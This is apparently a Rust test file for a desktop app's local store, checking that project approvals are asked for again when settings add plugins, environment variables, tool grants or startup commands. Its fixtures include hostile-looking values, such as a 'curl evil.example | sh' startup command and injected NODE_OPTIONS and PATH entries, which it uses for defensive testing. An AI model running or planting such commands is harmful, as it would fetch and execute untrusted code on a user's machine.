// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

use std::os::unix::fs::PermissionsExt;
use std::time::Duration;

use super::*;

/// The config home a test writes its store under.
fn machine() -> tempfile::TempDir {
    tempfile::tempdir().expect("a temp config home")
}

fn a_plane(at: &Path) -> PathBuf {
    std::fs::create_dir_all(at).unwrap();
    std::fs::write(at.join(crate::plane::MANIFEST), "").unwrap();
    at.to_path_buf()
}

fn mode_of(path: &Path) -> u32 {
    std::fs::symlink_metadata(path)
        .unwrap()
        .permissions()
        .mode()
        & 0o777
}

fn one_plane() -> Store {
    let mut store = Store::default();
    store.remember(
        Path::new("/Users/aharon/IdeaProjects/charter"),
        1_758_000_000,
    );
    store
}

// ---------------------------------------------------------------- what it is for

#[test]
fn what_was_written_is_what_the_next_launch_reads() {
    let machine = machine();
    let mut store = one_plane();
    store.approve(
        Path::new("/Users/aharon/work/other"),
        1_758_000_100,
        Contribution {
            plugins: [("market@repo".to_owned(), "true".to_owned())]
                .into_iter()
                .collect(),
            env: [("PATH".to_owned(), "/usr/bin".to_owned())]
                .into_iter()
                .collect(),
            starts: [(r#"{"program":"/bin/zsh"}"#.to_owned(), String::new())]
                .into_iter()
                .collect(),
            profiles: [(r#"{"profile":"work"}"#.to_owned(), String::new())]
                .into_iter()
                .collect(),
            grants: [("ops".to_owned(), r#"{"gh":""}"#.to_owned())]
                .into_iter()
                .collect(),
            fonts: [("themes/plex/fonts/Plex.woff2".to_owned(), "ab12".to_owned())]
                .into_iter()
                .collect(),
        },
    );
    store.windows = vec![Window {
        planes: vec![
            PathBuf::from("/Users/aharon/work/other"),
            PathBuf::from("/Users/aharon/IdeaProjects/charter"),
        ],
        active: 1,
    }];

    write(machine.path(), &store).unwrap();
    let back = read(machine.path());

    assert_eq!(back.store, store);
    assert_eq!(back.dropped, Vec::new());
    assert_eq!(back.unreadable, None);
}

// The device id (ADR 0066): what events say about where they happened.

#[test]
fn a_device_id_is_minted_once_and_kept() {
    let machine = machine();

    let first = device_id(machine.path()).expect("a device id");
    let again = device_id(machine.path()).expect("the same device id");

    assert_eq!(first, again, "a device keeps its id");
    assert_eq!(first.len(), 26, "a ULID: {first}");
    let store = read(machine.path()).store;
    assert_eq!(
        store.device.as_ref().map(|d| d.id.as_str()),
        Some(first.as_str())
    );
    assert!(store.device.unwrap().created > 0, "with when it was minted");
}

#[test]
fn an_update_that_is_not_about_the_device_keeps_its_id() {
    let machine = machine();
    let id = device_id(machine.path()).unwrap();

    update(machine.path(), |store| {
        store.channel = crate::updates::Channel::Dev
    })
    .unwrap();

    assert_eq!(device_id(machine.path()).unwrap(), id);
}

#[test]
fn a_store_written_before_device_ids_reads_as_having_none() {
    let machine = machine();
    write(machine.path(), &one_plane()).unwrap();
    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(
        !text.contains("device"),
        "nothing minted until asked: {text}"
    );
    assert_eq!(read(machine.path()).store.device, None);
}

// The seventh (ADR 0083, OB-17): the ISO week this machine's weekly count was last taken.

#[test]
fn the_week_last_counted_survives_a_write_and_a_read_and_is_absent_until_one_is() {
    let machine = machine();
    let mut store = one_plane();
    write(machine.path(), &store).unwrap();
    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(!text.contains("weekly"), "nothing counted yet: {text}");
    assert_eq!(read(machine.path()).store.weekly, None);

    store.weekly = crate::updates::IsoWeek::named("2026-W41");
    write(machine.path(), &store).unwrap();

    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(text.contains(r#""weekly": "2026-W41""#), "{text}");
    assert_eq!(read(machine.path()).store.weekly, store.weekly);
}

#[test]
fn a_week_charter_did_not_write_reads_as_not_counted() {
    let machine = machine();
    write(machine.path(), &one_plane()).unwrap();
    for junk in [r#""soon""#, "41", "null", r#""2026-W99""#] {
        std::fs::write(
            file(machine.path()),
            format!(r#"{{"version":{VERSION},"at":0,"recents":[],"windows":[],"weekly":{junk}}}"#),
        )
        .unwrap();
        // Counted again this week is the cost, and the safe direction: it sends nothing more.
        assert_eq!(read(machine.path()).store.weekly, None, "{junk}");
    }
}

// The fifth thing this file holds (ADR 0042): which stream the app updates from.

#[test]
fn a_machine_that_never_chose_a_channel_is_on_stable_and_its_file_says_nothing() {
    let machine = machine();
    let store = one_plane();
    assert_eq!(store.channel, crate::updates::Channel::Stable);

    write(machine.path(), &store).unwrap();

    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(
        !text.contains("channel"),
        "the default is written into the file: {text}"
    );
    assert_eq!(
        read(machine.path()).store.channel,
        crate::updates::Channel::Stable
    );
}

#[test]
fn the_channel_survives_a_write_and_a_read() {
    let machine = machine();
    let mut store = one_plane();
    store.channel = crate::updates::Channel::Dev;

    write(machine.path(), &store).unwrap();

    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(text.contains(r#""channel": "dev""#), "{text}");
    let back = read(machine.path());
    assert_eq!(back.store.channel, crate::updates::Channel::Dev);
    assert_eq!(back.store, store, "the rest of the store moved with it");
    assert_eq!(back.dropped, Vec::new());
}

#[test]
fn a_channel_charter_did_not_write_leaves_the_machine_on_stable_and_says_so() {
    // The direction matters and is the whole test: a store somebody else edited, or one
    // that is corrupt, must not be able to move a machine onto a stream cut from any
    // green `main`. Every one of these is a way of being wrong, and all of them are
    // stable.
    for junk in [
        r#""dev ""#,
        r#""DEV""#,
        r#""Dev""#,
        r#""nightly""#,
        r#""""#,
        "7",
        "true",
        "null",
        r#"["dev"]"#,
        r#"{"name":"dev"}"#,
    ] {
        let machine = machine();
        let dir = private_dir(machine.path()).unwrap();
        std::fs::write(
            dir.join(FILE),
            format!(r#"{{"version":{VERSION},"at":0,"recents":[],"windows":[],"channel":{junk}}}"#),
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(
            back.store.channel,
            crate::updates::Channel::Stable,
            "{junk} moved the machine off stable"
        );
        assert_eq!(back.dropped.len(), 1, "{junk} was taken in silence");
        assert!(
            back.dropped[0]
                .to_string()
                .contains("is not an update channel purlis knows"),
            "{:?}",
            back.dropped[0]
        );
    }
}

#[test]
fn a_store_with_no_channel_field_at_all_is_not_a_dropped_row() {
    // Every store charter wrote before this field existed, and every store it writes for
    // a machine on the default. An absent field is an answer, not a fault.
    let machine = machine();
    let dir = private_dir(machine.path()).unwrap();
    std::fs::write(
        dir.join(FILE),
        format!(r#"{{"version":{VERSION},"at":0,"recents":[],"windows":[]}}"#),
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.channel, crate::updates::Channel::Stable);
    assert_eq!(
        back.dropped,
        Vec::new(),
        "an absent field was called a fault"
    );
}

#[test]
fn a_second_charter_changing_the_channel_does_not_drop_what_the_app_recorded() {
    // `update` is what makes this one act across processes, and the channel is the first
    // field in this file that a `charter` in a terminal writes while the app is running.
    let machine = machine();
    update(machine.path(), |store| {
        store.remember(Path::new("/planes/one"), 1);
    })
    .unwrap();

    update(machine.path(), |store| {
        store.channel = crate::updates::Channel::Dev;
    })
    .unwrap();

    let back = read(machine.path());
    assert_eq!(back.store.channel, crate::updates::Channel::Dev);
    assert_eq!(
        back.store.recents.len(),
        1,
        "changing the channel dropped the recents"
    );
}

#[test]
fn a_machine_with_no_store_at_all_is_simply_a_first_launch() {
    let machine = machine();

    let back = read(machine.path());

    assert_eq!(back.store, Store::default());
    assert_eq!(back.unreadable, None, "a missing store is not a refusal");
}

#[test]
fn the_most_recently_opened_plane_is_first_and_an_open_is_not_an_approval() {
    let mut store = Store::default();
    let first = Path::new("/planes/first");
    let second = Path::new("/planes/second");

    store.approve(first, 1, Contribution::default());
    store.remember(second, 2);
    store.remember(first, 3);

    assert_eq!(store.recents[0].plane, first);
    assert_eq!(store.recents[0].opened, 3);
    assert_eq!(store.recents[1].plane, second);
    assert!(
        store.recents[0].trust.is_some(),
        "re-opening an approved plane kept its approval"
    );
    assert!(
        store.recents[1].trust.is_none(),
        "opening a plane a second time must not become consent to it"
    );
}

#[test]
fn the_list_is_bounded_so_a_file_read_at_every_launch_cannot_grow_for_ever() {
    let mut store = Store::default();
    for n in 0..MOST_RECENTS + 10 {
        store.remember(&PathBuf::from(format!("/planes/{n}")), n as u64);
    }

    assert_eq!(store.recents.len(), MOST_RECENTS);
    assert_eq!(
        store.recents[0].plane,
        PathBuf::from(format!("/planes/{}", MOST_RECENTS + 9)),
        "the newest is kept"
    );
}

#[test]
fn forgetting_a_plane_forgets_the_approval_and_closes_its_tab() {
    let mut store = Store::default();
    let gone = Path::new("/planes/gone");
    store.approve(gone, 1, Contribution::default());
    store.remember(Path::new("/planes/kept"), 2);
    store.windows = vec![Window {
        planes: vec![PathBuf::from("/planes/kept"), gone.to_path_buf()],
        active: 1,
    }];

    store.forget(gone);

    assert!(store.recent(gone).is_none());
    assert_eq!(store.windows[0].planes, vec![PathBuf::from("/planes/kept")]);
    assert_eq!(store.windows[0].active, 0, "the active tab is still a tab");
    assert_eq!(
        store.consent(gone, &Contribution::default()),
        Consent::New,
        "a forgotten plane is asked about again"
    );
}

#[test]
fn forgetting_a_project_lets_go_of_the_name_its_window_link_kept() {
    let machine = machine();
    let (gone, kept) = (Path::new("/planes/gone"), Path::new("/planes/kept"));
    update(machine.path(), |store| {
        store.remember(gone, 1);
        store.remember(kept, 2);
    })
    .unwrap();
    let named = crate::windownames::name_for(machine.path(), gone, &[]).unwrap();
    let other = crate::windownames::name_for(machine.path(), kept, &[]).unwrap();

    assert!(forget_project(machine.path(), gone).unwrap());

    assert_ne!(
        crate::windownames::name_for(machine.path(), gone, &[]).unwrap(),
        named,
        "a forgotten project's link would take its runner chats back"
    );
    assert_eq!(
        crate::windownames::name_for(machine.path(), kept, &[]).unwrap(),
        other
    );
}

// ---------------------------------------------------------------- trust

fn a_contribution(plugins: &[(&str, &str)], env: &[(&str, &str)]) -> Contribution {
    Contribution {
        plugins: plugins
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect(),
        env: env
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect(),
        ..Contribution::default()
    }
}

/// A fingerprint of chats the reopen record would start on their own programs.
fn a_launch(programs: &[&str]) -> Contribution {
    Contribution {
        starts: programs
            .iter()
            .map(|program| (format!("{{\"program\":\"{program}\"}}"), String::new()))
            .collect(),
        ..Contribution::default()
    }
}

/// The same, for chats that name one of this machine's harness profiles.
fn on_profiles(names: &[&str]) -> Contribution {
    Contribution {
        profiles: names
            .iter()
            .map(|name| (format!("{{\"profile\":\"{name}\"}}"), String::new()))
            .collect(),
        ..Contribution::default()
    }
}

fn a_recorded_chat(program: &str, args: &[&str], profile: Option<&str>) -> crate::reopen::Chat {
    crate::reopen::Chat {
        program: program.to_owned(),
        args: args.iter().map(|arg| (*arg).to_owned()).collect(),
        cwd: Some(PathBuf::from("/planes/here")),
        name: "ide.1".to_owned(),
        resume: None,
        active: false,
        profile: profile.map(str::to_owned),
        persona: None,
        show_footer: false,
        pinned: false,
        number: None,
        label: None,
        from: None,
        renamed_from: None,
        ..Default::default()
    }
}

#[test]
fn a_plane_nobody_approved_is_asked_about() {
    let store = Store::default();

    let consent = store.consent(Path::new("/planes/new"), &Contribution::default());

    assert_eq!(consent, Consent::New);
    assert!(consent.must_ask());
}

#[test]
fn an_approved_plane_that_contributes_what_it_did_opens_without_a_question() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    let same = a_contribution(&[("a@m", "true")], &[("PATH", "/usr/bin")]);
    store.approve(plane, 1, same.clone());

    let consent = store.consent(plane, &same);

    assert_eq!(consent, Consent::Unchanged);
    assert!(!consent.must_ask());
}

#[test]
fn a_plane_that_added_a_plugin_after_it_was_approved_is_asked_about_again() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, a_contribution(&[("a@m", "true")], &[]));

    let consent = store.consent(
        plane,
        &a_contribution(&[("a@m", "true"), ("evil@m", "true")], &[]),
    );

    assert!(consent.must_ask(), "a new plugin ran without being seen");
    assert_eq!(
        consent.changes(),
        [Change::PluginAdded("evil@m".to_owned())]
    );
}

#[test]
fn a_plane_that_added_an_environment_variable_is_asked_about_again() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, a_contribution(&[], &[("PATH", "/usr/bin")]));

    let consent = store.consent(
        plane,
        &a_contribution(&[], &[("PATH", "/usr/bin"), ("NODE_OPTIONS", "-r ./evil")]),
    );

    assert!(consent.must_ask());
    assert_eq!(
        consent.changes(),
        [Change::EnvAdded("NODE_OPTIONS".to_owned())]
    );
}

#[test]
fn a_plane_that_changed_what_an_environment_variable_says_is_asked_about_again() {
    // The sharper half, and the reason the VALUE is recorded and not only the name: the
    // key set is identical here.
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, a_contribution(&[], &[("PATH", "/usr/bin")]));

    let consent = store.consent(
        plane,
        &a_contribution(&[], &[("PATH", "/tmp/evil:/usr/bin")]),
    );

    assert!(consent.must_ask(), "a changed PATH is a grant nobody saw");
    assert_eq!(consent.changes(), [Change::EnvChanged("PATH".to_owned())]);
}

#[test]
fn a_plane_that_takes_a_grant_back_says_so_and_does_not_ask() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(
        plane,
        1,
        a_contribution(&[("a@m", "true")], &[("PATH", "/usr/bin")]),
    );

    let consent = store.consent(plane, &Contribution::default());

    assert!(
        !consent.must_ask(),
        "withdrawing a grant cannot make anything run, so asking only spends attention"
    );
    assert_eq!(
        consent,
        Consent::Noted(vec![
            Change::PluginRemoved("a@m".to_owned()),
            Change::EnvRemoved("PATH".to_owned()),
        ])
    );
}

#[test]
fn one_addition_among_removals_still_asks() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, a_contribution(&[("a@m", "1"), ("b@m", "1")], &[]));

    let consent = store.consent(plane, &a_contribution(&[("c@m", "1")], &[]));

    assert!(
        consent.must_ask(),
        "the question is whether anything NEW was granted"
    );
}

#[test]
fn what_a_plane_contributes_is_read_out_of_the_settings_that_travel() {
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    std::fs::create_dir_all(plane.join(".claude")).unwrap();
    std::fs::write(
        plane.join(crate::layer::SETTINGS),
        r#"{
          "enabledPlugins": {"market@repo": true},
          "env": {"PATH": "/tmp/evil"},
          "permissions": {"allow": ["Bash(rm:*)"], "deny": ["Read(./secrets)"]}
        }"#,
    )
    .unwrap();

    let contributes = Contribution::of(&plane);

    assert_eq!(
        contributes,
        a_contribution(&[("market@repo", "true")], &[("PATH", "/tmp/evil")]),
        "exactly the two keys layer::WORKSPACE_KEYS carries into a harness's settings"
    );
}

#[test]
fn a_plane_whose_settings_charter_cannot_read_contributes_nothing() {
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));

    assert_eq!(Contribution::of(&plane), Contribution::default());
}

// ---------------------------------------------------------------- persona tool grants

/// A persona in `plane` declaring `tools`.
fn a_persona(plane: &Path, name: &str, tools: &str) {
    let dir = plane.join("personas").join(name);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("persona.md"),
        format!("---\nrole: R\ntools: {tools}\n---\n"),
    )
    .unwrap();
}

/// A fingerprint of one persona's grant, as `Contribution::read` takes it.
fn granting(persona: &str, grant: &str) -> Contribution {
    Contribution {
        grants: [(persona.to_owned(), grant.to_owned())]
            .into_iter()
            .collect(),
        ..Contribution::default()
    }
}

#[test]
fn each_personas_tool_grant_is_part_of_what_a_plane_contributes() {
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    a_persona(&plane, "ops", "gh, kubectl");
    a_persona(&plane, "writer", "");

    let contributes = Contribution::of(&plane);

    assert_eq!(
        contributes.grants.keys().collect::<Vec<_>>(),
        vec!["ops"],
        "a persona that grants nothing contributes nothing"
    );
    assert_eq!(
        crate::personagrant::grant_from_text(&contributes.grants["ops"]),
        [
            ("gh".to_owned(), String::new()),
            ("kubectl".to_owned(), String::new())
        ]
        .into_iter()
        .collect()
    );
}

#[cfg(unix)]
#[test]
fn a_persona_program_is_fingerprinted_by_its_bytes() {
    use std::os::unix::fs::PermissionsExt;
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    a_persona(&plane, "ops", "deploy");
    let bin = plane.join("personas/ops/bin");
    std::fs::create_dir_all(&bin).unwrap();
    let script = bin.join("deploy");
    std::fs::write(&script, "#!/bin/sh\necho one\n").unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    let before = Contribution::of(&plane);

    std::fs::write(&script, "#!/bin/sh\necho two\n").unwrap();
    let after = Contribution::of(&plane);

    assert_ne!(before.grants, after.grants);
    let mut store = Store::default();
    let at = Path::new("/planes/known");
    store.approve(at, 1, before);
    assert_eq!(
        store.consent(at, &after),
        Consent::Grew(vec![Change::GrantChanged("ops".to_owned())])
    );
}

#[test]
fn a_new_or_changed_tool_grant_asks_again_and_a_withdrawn_one_only_reports() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, granting("ops", r#"{"gh":""}"#));

    assert_eq!(
        store.consent(plane, &granting("ops", r#"{"gh":""}"#)),
        Consent::Unchanged
    );
    let widened = store.consent(plane, &granting("ops", r#"{"gh":"","kubectl":""}"#));
    assert_eq!(
        widened,
        Consent::Grew(vec![Change::GrantChanged("ops".to_owned())])
    );
    assert!(widened.must_ask());
    let mut two = granting("ops", r#"{"gh":""}"#);
    two.grants
        .insert("new".to_owned(), r#"{"gh":""}"#.to_owned());
    assert_eq!(
        store.consent(plane, &two),
        Consent::Grew(vec![Change::GrantAdded("new".to_owned())])
    );
    let gone = store.consent(plane, &Contribution::default());
    assert_eq!(
        gone,
        Consent::Noted(vec![Change::GrantRemoved("ops".to_owned())])
    );
    assert!(!gone.must_ask());
    assert_eq!(
        Change::GrantChanged("ops".to_owned()).to_string(),
        "the tool grant of persona ops has changed"
    );
}

#[test]
fn an_approval_made_before_grants_were_fingerprinted_asks_once() {
    // A store written by a charter that did not fingerprint grants has none recorded. The
    // plane's grants then read as new, which asks: an approval that never showed a grant
    // is not an approval of one.
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, Contribution::default());

    assert!(
        store
            .consent(plane, &granting("ops", r#"{"gh":""}"#))
            .must_ask()
    );
}

#[test]
fn vouching_refreshes_the_record_charter_writes_and_nothing_it_does_not() {
    // charter vouches for the reopen record, which it writes itself. Settings and persona
    // grants are written by whoever commits to the plane, so a vouch that took them too
    // would approve a pulled change on the operator's next chat.
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    let approved = Contribution {
        env: [("A".to_owned(), "1".to_owned())].into_iter().collect(),
        plugins: [("p@m".to_owned(), "true".to_owned())]
            .into_iter()
            .collect(),
        grants: [("ops".to_owned(), r#"{"gh":""}"#.to_owned())]
            .into_iter()
            .collect(),
        ..Contribution::default()
    };
    store.approve(plane, 1, approved.clone());
    let mut now = a_launch(&["/bin/zsh"]);
    now.profiles = on_profiles(&["work"]).profiles;
    now.env = [("A".to_owned(), "2".to_owned())].into_iter().collect();
    now.plugins = [("q@m".to_owned(), "true".to_owned())]
        .into_iter()
        .collect();
    now.grants = [("ops".to_owned(), r#"{"gh":"","sh":""}"#.to_owned())]
        .into_iter()
        .collect();

    store.vouch(plane, now.clone(), 2);

    let kept = &store
        .recent(plane)
        .unwrap()
        .trust
        .as_ref()
        .unwrap()
        .contributed;
    assert_eq!(kept.starts, now.starts);
    assert_eq!(kept.profiles, now.profiles);
    assert_eq!(kept.env, approved.env);
    assert_eq!(kept.plugins, approved.plugins);
    assert_eq!(kept.grants, approved.grants);
    assert!(store.consent(plane, &now).must_ask());
}

#[test]
fn the_grant_approved_for_a_persona_is_answered_by_the_plane_it_was_approved_under() {
    let mut store = Store::default();
    let plane = Path::new("/planes/known");
    store.approve(plane, 1, granting("ops", r#"{"gh":""}"#));

    assert_eq!(store.approved_grant(plane, "ops"), Some(r#"{"gh":""}"#));
    assert_eq!(store.approved_grant(plane, "writer"), None);
    assert_eq!(
        store.approved_grant(Path::new("/planes/other"), "ops"),
        None
    );
    store.remember(Path::new("/planes/seen"), 2);
    assert_eq!(store.approved_grant(Path::new("/planes/seen"), "ops"), None);
}

#[cfg(unix)]
#[test]
fn two_updates_at_once_keep_both_rather_than_one_losing_the_other() {
    // charter-app#123's third half. `update` is a read-modify-write and every writer
    // replaces the WHOLE document, so two of them interleaving does not merge — it drops
    // one, and what is dropped is an approval, a pin, or the projects a window had open.
    //
    // It was reachable before the opener and it is ordinary now: Tauri runs commands on a
    // thread pool, `Records::vouch` fires whenever a chat opens or closes, and #125's
    // `remember_arrangement` fires on every tab change — its own author's words, *"this
    // fires far more often than an approval."*
    //
    // **Sixteen, and each remembers its own plane**, well inside `MOST_RECENTS`, so the
    // trim cannot be what is missing. Without the lock this loses entries on every run of
    // this machine; with it the count is exact.
    const AT_ONCE: usize = 16;
    let held = machine();
    let config = held.path().to_path_buf();
    // Every thread waits for the last one, so they are inside `update` together rather
    // than politely one after another.
    let ready = std::sync::Arc::new(std::sync::Barrier::new(AT_ONCE));

    let racing: Vec<_> = (0..AT_ONCE)
        .map(|which| {
            let config = config.clone();
            let ready = std::sync::Arc::clone(&ready);
            std::thread::spawn(move || {
                let plane = PathBuf::from(format!("/planes/p{which}"));
                ready.wait();
                update(&config, move |store| store.remember(&plane, 1)).expect("it writes");
            })
        })
        .collect();
    for thread in racing {
        thread.join().expect("no writer panicked");
    }

    let store = read(&config).store;
    let kept: Vec<String> = store
        .recents
        .iter()
        .map(|entry| entry.plane.display().to_string())
        .collect();
    for which in 0..AT_ONCE {
        assert!(
            kept.contains(&format!("/planes/p{which}")),
            "p{which} was written and then lost to another writer's copy of the store: \
             {kept:?}"
        );
    }
}

/// Settings a stranger's plane could hold, written at the exact path the approval opens.
fn settings_of(plane: &Path, text: &str) {
    std::fs::create_dir_all(plane.join(".claude")).unwrap();
    std::fs::write(plane.join(crate::layer::SETTINGS), text).unwrap();
}

#[cfg(unix)]
#[test]
fn a_settings_file_over_the_bound_contributes_nothing_rather_than_being_read_whole() {
    // charter-app#112. This runs against a directory the operator has just pointed at and
    // has NOT yet trusted, before the app has a window — and `.charter/` is gitignored
    // while `.claude/settings.json` is committed by design, so this file is the one half
    // of a plane's contribution that arrives through an ordinary `git clone`. A sparse
    // multi-megabyte file packs small in a clone and arrives full size.
    //
    // **Valid JSON, and over the bound by padding.** A giant of NUL bytes would answer
    // `None` from `serde_json` whether or not the bound is there, and prove nothing: the
    // guard has to be the thing that changes the answer.
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    let padding = " ".repeat(usize::try_from(crate::reopen::MAX_BYTES).unwrap());
    settings_of(
        &plane,
        &format!("{{\"env\": {{\"EVIL\": \"yes\"}}{padding}}}"),
    );
    assert!(
        std::fs::metadata(plane.join(crate::layer::SETTINGS))
            .unwrap()
            .len()
            > crate::reopen::MAX_BYTES,
        "the fixture has to be over the bound for the bound to be what answers"
    );

    let contributes = Contribution::of(&plane);

    assert_eq!(
        contributes,
        Contribution::default(),
        "a settings file over the bound was read whole and credited with what it said"
    );
}

#[cfg(unix)]
#[test]
fn a_settings_file_that_is_a_fifo_answers_rather_than_blocking_the_approval() {
    // charter-app#112, and the consequence that has nothing to click on: a FIFO is not a
    // link, so a containment check waves it through, and `read_to_string` on one with no
    // writer **never returns**. `lib.rs`'s `setup` runs this before the first frame, so an
    // unfixed charter pointed at such a directory can only be killed.
    //
    // The red is a hang, which is what the watchdog turns into a failure: a test that
    // simply never finishes reads as an infrastructure fault rather than as this defect.
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    std::fs::create_dir_all(plane.join(".claude")).unwrap();
    let at = plane.join(crate::layer::SETTINGS);
    let made = crate::forklock::status(std::process::Command::new("mkfifo").arg(&at))
        .expect("mkfifo runs");
    assert!(made.success(), "a FIFO at the path the approval opens");

    let (tell, answered) = std::sync::mpsc::channel();
    let reading = plane.clone();
    std::thread::spawn(move || {
        let _ = tell.send(Contribution::of(&reading));
    });

    let contributes = answered
        .recv_timeout(std::time::Duration::from_secs(20))
        .expect(
            "the approval never came back: a FIFO at the plane's settings blocked it, and \
             there is no window yet to cancel it from",
        );
    assert_eq!(contributes, Contribution::default());
}

#[cfg(unix)]
#[test]
fn a_fifo_that_already_holds_a_grant_is_declined_rather_than_drained() {
    // The other half of the FIFO, and the half `O_NONBLOCK` alone does NOT answer. With
    // the flag, a pipe with nothing in it fails the read with `WouldBlock` and charter
    // contributes nothing — but that is an accident of there being no writer, not a
    // decision. A pipe that already holds bytes and has no writer left hands them over
    // and reads as EOF, so an unguarded charter would draw an approval dialog describing
    // a plugin and a PATH that exist nowhere on disk, and then record them as approved.
    //
    // **Deterministic, and that is why the reader is opened here first.** A FIFO's buffer
    // lives only while some descriptor is open, so the test holds a read end for the
    // whole of it: the writer can then write and close, and the bytes are still there
    // when charter opens its own descriptor. A writer racing a reader would make this a
    // coin toss.
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    std::fs::create_dir_all(plane.join(".claude")).unwrap();
    let at = plane.join(crate::layer::SETTINGS);
    let made = crate::forklock::status(std::process::Command::new("mkfifo").arg(&at))
        .expect("mkfifo runs");
    assert!(made.success(), "a FIFO at the path the approval opens");

    // Held open for the length of the test: this is what keeps the pipe, and the bytes
    // in it, alive after the writer has gone.
    let _keeping_it_open = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(rustix::fs::OFlags::NONBLOCK.bits() as i32)
        .open(&at)
        .expect("a reader on the pipe");
    {
        // Opening for writing succeeds at once now that a reader exists. Closed at the
        // end of this block, which is what makes charter's own read see EOF rather than
        // `WouldBlock`.
        let mut writer = std::fs::OpenOptions::new()
            .write(true)
            .open(&at)
            .expect("a writer on the pipe");
        writer
            .write_all(br#"{"enabledPlugins":{"piped@market":true},"env":{"PATH":"/tmp/evil"}}"#)
            .expect("the grant goes into the pipe");
    }

    let contributes = Contribution::of(&plane);

    assert_eq!(
        contributes,
        Contribution::default(),
        "the approval dialog was drawn from a pipe: it would have described a plugin and \
         a PATH that are on nobody's disk, and the store would have recorded them"
    );
}

#[cfg(unix)]
#[test]
fn settings_linked_out_of_the_plane_contribute_nothing() {
    // The half that was already held, pinned here because it is now held by a different
    // line: `open_no_link`'s own `strip_prefix` against the RESOLVED root, rather than by
    // a `within_plane` call in front of a bare read.
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    let outside = held.path().join("outside.json");
    std::fs::write(&outside, r#"{"env": {"EVIL": "yes"}}"#).unwrap();
    std::fs::create_dir_all(plane.join(".claude")).unwrap();
    std::os::unix::fs::symlink(&outside, plane.join(crate::layer::SETTINGS)).unwrap();

    assert_eq!(Contribution::of(&plane), Contribution::default());
}

#[cfg(unix)]
#[test]
fn one_read_answers_what_the_plane_contributes_and_what_it_would_start() {
    // charter-app#123's fix, at the seam it is made at. The contribution the dialog draws
    // and the record `put_back` executes come out of the SAME read, so there is no second
    // read for a write to land in front of.
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    settings_of(&plane, r#"{"env": {"CHARTER_HARNESS": "claude-code"}}"#);
    crate::reopen::write(
        &plane,
        &crate::reopen::Record {
            views: Vec::new(),
            dealt: 0,
            relaunch_after_update: false,
            clone_seat: None,
            focus: None,
            chats: vec![crate::reopen::Chat {
                program: "/bin/echo".to_owned(),
                args: vec!["shown".to_owned()],
                cwd: None,
                name: "ide.1".to_owned(),
                resume: None,
                active: true,
                profile: None,
                persona: None,
                show_footer: false,
                pinned: false,
                number: None,
                label: None,
                from: None,
                renamed_from: None,
                ..Default::default()
            }],
        },
    )
    .unwrap();

    let reading = Contribution::read(&plane);

    assert_eq!(
        reading.contributes.starts.len(),
        1,
        "the contribution did not describe what the record would start"
    );
    let record = reading.record.expect("the record came back with it");
    assert_eq!(
        record.chats.first().map(|chat| chat.args.as_slice()),
        Some(["shown".to_owned()].as_slice()),
        "the bytes that were judged are not the bytes that came back"
    );
}

#[test]
fn a_plugins_key_of_any_shape_is_still_compared_rather_than_read_as_nothing() {
    let as_array = plugins_of(&serde_json::json!(["a@m", "b@m"]));
    let as_object = plugins_of(&serde_json::json!({"a@m": true}));
    let as_nonsense = plugins_of(&serde_json::json!(7));

    assert_eq!(as_array.keys().collect::<Vec<_>>(), ["a@m", "b@m"]);
    assert_eq!(as_object.get("a@m"), Some(&"true".to_owned()));
    assert_eq!(as_nonsense.len(), 1, "{as_nonsense:?} was read as nothing");
}

#[test]
fn what_opens_a_plane_includes_the_programs_its_reopen_record_would_start() {
    // `lib.rs`'s `setup`: "Before a single session is started, because `put_back` below
    // starts them." For a chat with no profile, `Chats::start` decides what runs "from
    // the record alone" — so this file is an execution input, read before any window.
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));
    crate::reopen::write(
        &plane,
        &crate::reopen::Record {
            views: Vec::new(),
            dealt: 0,
            relaunch_after_update: false,
            clone_seat: None,
            focus: None,
            chats: vec![
                a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
                a_recorded_chat("claude", &[], Some("work")),
            ],
        },
    )
    .unwrap();

    let what = Contribution::of(&plane);

    assert_eq!(what.starts.len(), 1, "{:?}", what.starts);
    assert!(
        what.starts
            .keys()
            .next()
            .is_some_and(|line| line.contains("/bin/sh") && line.contains("curl evil.example")),
        "the whole command line is the fingerprint: {:?}",
        what.starts
    );
    assert_eq!(what.profiles.len(), 1, "{:?}", what.profiles);
}

#[test]
fn a_plane_whose_record_charter_would_refuse_is_credited_with_starting_nothing() {
    // A record the app refuses is one it starts no chats from — `lib.rs` logs the
    // refusal and puts back `Record::default()`.
